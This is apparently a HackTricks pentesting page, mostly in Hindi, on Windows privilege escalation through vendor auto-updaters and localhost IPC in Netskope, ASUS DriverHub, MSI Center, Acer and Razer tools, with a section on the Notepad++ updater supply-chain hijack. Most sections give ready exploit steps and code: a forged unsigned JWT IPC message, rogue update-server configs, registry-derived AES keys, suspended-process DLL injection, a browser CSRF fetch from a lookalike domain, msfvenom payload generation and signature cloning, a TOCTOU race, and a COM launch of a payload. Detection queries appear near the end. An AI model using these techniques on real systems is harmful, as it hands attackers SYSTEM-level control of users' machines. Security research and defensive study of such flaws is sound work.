# Enterprise Auto-Updaters और Privileged IPC का दुरुपयोग (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

यह पृष्ठ उन Windows local privilege escalation श्रृंखलाओं का सामान्यीकरण करता है जो enterprise endpoint agents और updaters में पाई जाती हैं, जो एक low-friction IPC surface और privileged update flow एक्सपोज़ करते हैं। एक प्रतिनिधि उदाहरण Netskope Client for Windows < R129 (CVE-2025-0309) है, जहाँ एक low-privileged user को attacker-controlled server में enrollment के लिए मजबूर किया जा सकता है और फिर एक malicious MSI पहुंचाया जा सकता है जिसे SYSTEM service इंस्टॉल कर देती है।

मुख्य विचार जिन्हें आप समान products पर पुन: उपयोग कर सकते हैं:
- एक privileged service के localhost IPC का दुरुपयोग करके re-enrollment या reconfiguration attacker server पर मजबूर करें।
- vendor के update endpoints को implement करें, एक rogue Trusted Root CA पहुंचाएं, और updater को एक malicious, “signed” package की ओर निर्देशित करें।
- कमजोर signer checks (CN allow-lists), optional digest flags, और lax MSI properties से बायपास करें।
- यदि IPC “encrypted” है, तो registry में संग्रहीत world-readable machine identifiers से key/IV निकाले।
- यदि service callers को image path/process name के आधार पर सीमित करती है, तो allow-listed process में inject करें या एक process को suspended spawn कर के minimal thread-context patch के माध्यम से अपना DLL bootstrap करें।

---
## 1) localhost IPC के माध्यम से attacker server पर enrollment मजबूर करना

कई agents एक user-mode UI process के साथ आते हैं जो localhost TCP पर JSON का उपयोग करके SYSTEM service से बात करती है।

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

एक्सप्लॉइट प्रवाह:
1) एक JWT enrollment token बनाएं जिसकी claims backend host (जैसे AddonUrl) को नियंत्रित करें। alg=None का उपयोग करें ताकि किसी signature की आवश्यकता न हो।
2) अपने JWT और tenant name के साथ provisioning कमांड को invoke करते हुए IPC संदेश भेजें:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) सर्विस आपके rogue server से enrollment/config के लिए अनुरोध करना शुरू कर देती है, उदा.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

नोट:
- यदि caller verification path/name-आधारित है, तो अनुरोध एक allow-listed vendor binary से originate करें (देखें §4).

---
## 2) Hijacking अपडेट चैनल करके SYSTEM के रूप में कोड चलाना

एक बार जब क्लाइंट आपके सर्वर से बात करता है, तो अपेक्षित endpoints को लागू करें और इसे attacker MSI की ओर मोड़ें। सामान्य क्रम:

1) /v2/config/org/clientconfig → बहुत कम updater interval के साथ JSON config लौटाएँ, उदा.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → एक PEM CA प्रमाणपत्र लौटाता है। सेवा इसे Local Machine Trusted Root store में इंस्टॉल कर देती है।
3) /v2/checkupdate → मेटाडेटा दें जो एक malicious MSI और फर्जी संस्करण की ओर इशारा करे।

Bypassing common checks seen in the wild:
- Signer CN allow-list: सेवा संभवतः केवल Subject CN को “netSkope Inc” या “Netskope, Inc.” के बराबर होने की जाँच करती है। आपका rogue CA उस CN के साथ एक leaf जारी कर सकता है और MSI पर साइन कर सकता है।
- CERT_DIGEST property: CERT_DIGEST नामक एक benign MSI property शामिल करें। इंस्टॉल पर कोई क्रियान्वयन नहीं।
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) अतिरिक्त क्रिप्टोग्राफिक वैलिडेशन को disable कर देता है।

Result: SYSTEM service आपके MSI को C:\ProgramData\Netskope\stAgent\data\*.msi से इंस्टॉल करके arbitrary code को NT AUTHORITY\SYSTEM के रूप में execute कर देता है।

---
## 3) Forging encrypted IPC requests (when present)

R127 से, Netskope ने IPC JSON को encryptData field में रैप किया जो Base64 जैसा दिखता था। reversing से पता चला कि AES इस्तेमाल हुआ है और key/IV ऐसे registry मानों से निकाले जाते हैं जिन्हें कोई भी user पढ़ सकता है:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers encryption reproduce कर सकते हैं और standard user से valid encrypted commands भेज सकते हैं। सामान्य सुझाव: अगर कोई agent अचानक अपने IPC को “encrypt” करता है, तो HKLM के भीतर device IDs, product GUIDs, install IDs जैसे मैटेरियल खोजें।

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

कुछ सेवाएं peer को authenticate करने के लिए TCP connection के PID को resolve करके image path/name की तुलना vendor के allow-listed binaries से करती हैं जो Program Files के नीचे होते हैं (उदा., stagentui.exe, bwansvc.exe, epdlp.exe)।

दो practical bypasses:
- DLL injection को किसी allow-listed process (उदा., nsdiag.exe) में करके वहां से IPC proxy करें।
- किसी allow-listed binary को suspended में spawn करें और CreateRemoteThread का उपयोग किए बिना अपना proxy DLL bootstrap करें (देखें §5) ताकि driver-enforced tamper नियमों को पूरा किया जा सके।

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products अक्सर minifilter/OB callbacks driver (उदा., Stadrv) के साथ आते हैं जो protected processes के handles से खतरनाक rights हटाता है:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME को हटा देता है
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE तक सीमित करता है

एक भरोसेमंद user-mode loader जो इन constraints का सम्मान करता है:
1) CreateProcess के साथ vendor binary को CREATE_SUSPENDED में चलाएँ।
2) वे handles प्राप्त करें जो आपको अभी भी allowed हैं: process पर PROCESS_VM_WRITE | PROCESS_VM_OPERATION, और एक thread handle जिस पर THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (या यदि आप किसी जाने-पहचाने RIP पर code patch कर रहे हैं तो केवल THREAD_RESUME)।
3) ntdll!NtContinue (या कोई अन्य early, guaranteed-mapped thunk) को ओवरराइट करके एक छोटा सा stub डालें जो आपके DLL path पर LoadLibraryW कॉल करे, फिर वापस जंप करे।
4) ResumeThread करके अपने stub को इन-प्रोसेस ट्रिगर करें, जिससे आपका DLL लोड हो जाएगा।

क्योंकि आपने पहले से-protected process पर PROCESS_CREATE_THREAD या PROCESS_SUSPEND_RESUME का उपयोग नहीं किया (आपने इसे बनाया था), इसलिए driver की नीति संतुष्ट रहती है।

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) rogue CA, malicious MSI signing को automate करता है, और आवश्यक endpoints सर्व करता है: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate।
- UpSkope एक custom IPC client है जो arbitrary (वैकल्पिक रूप से AES-encrypted) IPC messages बनाता है और suspended-process injection शामिल करता है ताकि संदेश किसी allow-listed binary से originate हों।

## 7) Fast triage workflow for unknown updater/IPC surfaces

जब किसी नए endpoint agent या motherboard “helper” suite का सामना हो, तो एक त्वरित workflow अक्सर यह बताने के लिए पर्याप्त होता है कि क्या आप एक promising privesc target देख रहे हैं:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) संभावित named pipes को सूचीबद्ध करें:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) plugin-based IPC servers द्वारा उपयोग किए जाने वाले registry-backed routing data को निकालें:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) पहले user-mode client से endpoint names, JSON keys, और command IDs निकालें। Packed Electron/.NET frontends अक्सर full schema को leak कर देते हैं:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
यदि लक्ष्य केवल PID, image path, या process name के द्वारा ही कॉलरों का प्रमाणीकरण करता है, तो इसे सीमा की तरह नहीं बल्कि एक छोटी बाधा की तरह समझें: वैध क्लाइंट में injecting करना, या allow-listed process से कनेक्शन बनाना अक्सर सर्वर की जाँचों को संतुष्ट करने के लिए पर्याप्त होता है। For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub 127.0.0.1:53000 पर एक user-mode HTTP service (ADU.exe) शिप करता है जो browser कॉल्स को उम्मीद करता है कि वे https://driverhub.asus.com से आ रहे हों। Origin filter सरलता से Origin header और `/asus/v1.0/*` द्वारा एक्सपोज़ किए गए download URLs पर `string_contains(".asus.com")` चलाता है। इसीलिए किसी भी attacker-controlled host जैसे `https://driverhub.asus.com.attacker.tld` चेक पास कर देता है और JavaScript से state-changing requests जारी कर सकता है। अतिरिक्त bypass पैटर्न के लिए देखें [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md).

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
नीचे प्रदर्शित PowerShell CLI भी तब सफल होता है जब Origin header को विश्वसनीय मान के रूप में स्पूफ किया जाता है:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) असुरक्षित कोड-हस्ताक्षर सत्यापन और सर्टिफिकेट क्लोनिंग (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` JSON बॉडी में परिभाषित arbitrary executables डाउनलोड करता है और उन्हें `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` में कैश करता है। Download URL वैलिडेशन वही substring लॉजिक पुन: उपयोग करता है, इसलिए `http://updates.asus.com.attacker.tld:8000/payload.exe` स्वीकार कर लिया जाता है। डाउनलोड के बाद, ADU.exe केवल यह जांचता है कि PE में एक सिग्नेचर है और Subject स्ट्रिंग ASUS से मैच करती है before running it – कोई `WinVerifyTrust`, कोई chain validation नहीं।

To weaponize the flow:
1) payload बनाएं (उदा., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`)।
2) ASUS के signer को उसमें क्लोन करें (उदा., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`)।
3) `pwn.exe` को `.asus.com` lookalike domain पर होस्ट करें और ऊपर दिए गए ब्राउज़र CSRF के माध्यम से UpdateApp ट्रिगर करें।

क्योंकि Origin और URL फ़िल्टर substring-आधारित हैं और signer चेक केवल स्ट्रिंग्स की तुलना करता है, DriverHub हमलावर बाइनरी को अपने उच्च-प्राधिकार संदर्भ में खींचकर निष्पादित कर लेता है।

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center की SYSTEM सेवा एक TCP प्रोटोकॉल एक्सपोज़ करती है जहाँ हर फ्रेम `4-byte ComponentID || 8-byte CommandID || ASCII arguments` होता है। कोर कंपोनेंट (Component ID `0f 27 00 00`) `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` भेजता है। इसका हैंडलर:
1) उपलब्ध कराए गए executable की कॉपी करता है `C:\Windows\Temp\MSI Center SDK.exe` में।
2) `CS_CommonAPI.EX_CA::Verify` के माध्यम से सिग्नेचर सत्यापित करता है (certificate subject “MICRO-STAR INTERNATIONAL CO., LTD.” के बराबर होना चाहिए और `WinVerifyTrust` सफल होना चाहिए)।
3) एक scheduled task बनाता है जो temp फ़ाइल को SYSTEM के रूप में attacker-controlled arguments के साथ चलाता है।

कॉप की गई फ़ाइल verification और `ExecuteTask()` के बीच लॉक नहीं रहती। एक हमलावर कर सकता है:
- Frame A भेजे जो एक legitimate MSI-signed binary की ओर इशारा करता है (यह सुनिश्चित करता है कि सिग्नेचर चेक पास हो और टास्क कतारबद्ध हो)।
- इसे repeated Frame B संदेशों के साथ रेस करे जो एक malicious payload की ओर इशारा करते हैं, और सत्यापन पूरा होने के ठीक बाद `MSI Center SDK.exe` को overwrite कर दें।

जब scheduler ट्रिगर होता है, तो यह overwrite किए गए payload को SYSTEM के तहत निष्पादित कर देता है बावजूद इसके कि मूल फ़ाइल सत्यापित की गई थी। भरोसेमंद एक्सप्लॉइट के लिए दो goroutines/threads का उपयोग किया जाता है जो CMD_AutoUpdateSDK को स्पैम करते हैं जब तक TOCTOU विंडो जीत नहीं जाती।

---
## 2) कस्टम SYSTEM-लेवल IPC और impersonation का दुरुपयोग (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` द्वारा लोड की गई हर plugin/DLL को एक Component ID मिलता है जो `HKLM\SOFTWARE\MSI\MSI_CentralServer` के तहत स्टोर होता है। एक फ्रेम के पहले 4 बाइट उस कंपोनेंट का चयन करते हैं, जिससे attackers arbitrary modules को कमांड रूट कर सकते हैं।
- Plugins अपने task runners परिभाषित कर सकते हैं। `Support\API_Support.dll` `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` एक्सपोज़ करता है और सीधे `API_Support.EX_Task::ExecuteTask()` को कॉल करता है जिसमें **no signature validation** होती – कोई भी local user इसे `C:\Users\<user>\Desktop\payload.exe` की ओर पॉइंट करके निश्चित रूप से SYSTEM execution प्राप्त कर सकता है।
- loopback को Wireshark से sniff करने या dnSpy में .NET बाइनरीज़ को instrument करने से जल्दी ही Component ↔ command मैपिंग सामने आ जाती है; कस्टम Go/ Python क्लाइंट्स फिर फ्रेम्स को replay कर सकते हैं।

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) `\\.\pipe\treadstone_service_LightMode` एक्सपोज़ करता है, और इसकी discretionary ACL रिमोट क्लाइंट्स को अनुमति देती है (उदा., `\\TARGET\pipe\treadstone_service_LightMode`)। command ID `7` के साथ एक फ़ाइल पाथ भेजने पर सर्विस का process-spawning routine invoke होता है।
- क्लाइंट लाइब्रेरी args के साथ एक magic terminator byte (113) सीरियलाइज़ करती है। Frida/`TsDotNetLib` के साथ dynamic instrumentation (instrumentation tips के लिए देखिए [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)) दिखाती है कि नेटिव हैंडलर इस वैल्यू को `SECURITY_IMPERSONATION_LEVEL` और integrity SID में मैप करता है before calling `CreateProcessAsUser`।
- 113 (`0x71`) को 114 (`0x72`) से स्वैप करने पर यह generic ब्रांच में चला जाता है जो पूरा SYSTEM टोकन रखता है और एक high-integrity SID (`S-1-16-12288`) सेट कर देता है। इसलिए spawn हुई बाइनरी unrestricted SYSTEM के रूप में चलती है, लोकली और cross-machine दोनों में।
- इसे exposed installer flag (`Setup.exe -nocheck`) के साथ मिलाकर ACC को लैब VMs पर भी स्टैंड अप किया जा सकता है और vendor हार्डवेयर के बिना पाइप का परीक्षण किया जा सकता है।

ये IPC बग दिखाते हैं कि localhost सेवाओं को mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) लागू करना चाहिए और हर मॉड्यूल का “run arbitrary binary” helper समान signer verifications साझा करे।

---
## 3) COM/IPC “elevator” helpers जो कमजोर user-mode validation पर निर्भर हैं (Razer Synapse 4)

Razer Synapse 4 ने इस परिवार में एक और उपयोगी पैटर्न जोड़ा: एक low-privileged user COM helper से `RzUtility.Elevator` के माध्यम से एक प्रोसेस लॉन्च करने के लिए कह सकता है, जबकि trust निर्णय एक user-mode DLL (`simple_service.dll`) को सौंप दिया जाता है बजाय इसके कि उसे प्रिविलेज्ड सीमा के अंदर मजबूत रूप से लागू किया जाए।

Observed exploitation path:
- COM object `RzUtility.Elevator` instantiate करें।
- elevated launch का अनुरोध करने के लिए `LaunchProcessNoWait(<path>, "", 1)` कॉल करें।
- public PoC में, `simple_service.dll` के अंदर PE-signature gate को request जारी करने से पहले patched out कर दिया गया है, जिससे किसी भी arbitrary attacker-chosen executable को लॉन्च करने की अनुमति मिल जाती है।

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: when reversing “helper” suites, do not stop at localhost TCP or named pipes. Check for COM classes with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny decision from the low-privilege side is a candidate privesc surface.

---
## कमजोर अपडेटर सत्यापन के माध्यम से Remote supply-chain hijack (WinGUp / Notepad++)

पुराने WinGUp-आधारित Notepad++ updaters अपडेट की प्रामाणिकता को पूरी तरह सत्यापित नहीं करते थे। जब attackers ने update server के hosting provider को compromise किया, वे XML manifest को बदल सकते थे और केवल चुने हुए clients को attacker URLs पर redirect कर सकते थे। क्योंकि client किसी भी HTTPS response को स्वीकार कर लेता था बिना trusted certificate chain और valid PE signature दोनों को enforce किये, victims ने trojanized NSIS `update.exe` को fetch और execute कर लिया।

ऑपरेशनल प्रवाह (कोई local exploit आवश्यक नहीं):
1. **Infrastructure interception**: CDN/hosting को compromise करें और update checks का जवाब attacker metadata के साथ दें जो malicious download URL की ओर इशारा करता है।
2. **Trojanized NSIS**: installer एक payload fetch/execute करता है और दो execution chains का दुरुपयोग करता है:
- **Bring-your-own signed binary + sideload**: signed Bitdefender `BluetoothService.exe` को bundle करें और उसकी search path में malicious `log.dll` डालें। जब signed binary चलेगा, Windows `log.dll` को sideload करेगा, जो Chrysalis backdoor को decrypt और reflectively load करता है (Warbird-protected + API hashing static detection को रोकने के लिए)।
- **Scripted shellcode injection**: NSIS एक compiled Lua script चलाता है जो Win32 APIs (उदा., `EnumWindowStationsW`) का उपयोग करके shellcode inject करता है और Cobalt Strike Beacon को stage करता है।

किसी भी auto-updater के लिए Hardening/detection takeaways:
- डाउनलोड किए गए installer पर **certificate + signature verification** लागू करें (vendor signer को pin करें, mismatched CN/chain को reject करें) और update manifest को स्वयं sign करें (उदा., XMLDSig). manifest-नियंत्रित redirects को तब तक block करें जब तक वे validate न हों।
- **BYO signed binary sideloading** को post-download detection pivot के रूप में मानें: alert तब करें जब कोई signed vendor EXE canonical install path के बाहर से DLL नाम load करे (उदा., Bitdefender loading `log.dll` from Temp/Downloads) और जब कोई updater temp से installers drop/execute करे जिनके पास non-vendor signatures हों।
- इस चेन में देखे गए **malware-specific artifacts** पर निगरानी रखें (generic pivots के रूप में उपयोगी): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` द्वारा `%TEMP%` में किए गए writes, और Lua-driven shellcode injection stages.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> Notepad++ के अलावा कोई इंस्टॉलर लॉन्च कर रहा है</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

ये पैटर्न किसी भी updater पर सामान्यीकृत होते हैं जो unsigned manifests स्वीकार करता है या installer signers को pin करने में विफल रहता है—network hijack + malicious installer + BYO-signed sideloading मिलकर “trusted” updates के रूप में छिपकर remote code execution दे देते हैं।

---
## संदर्भ
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
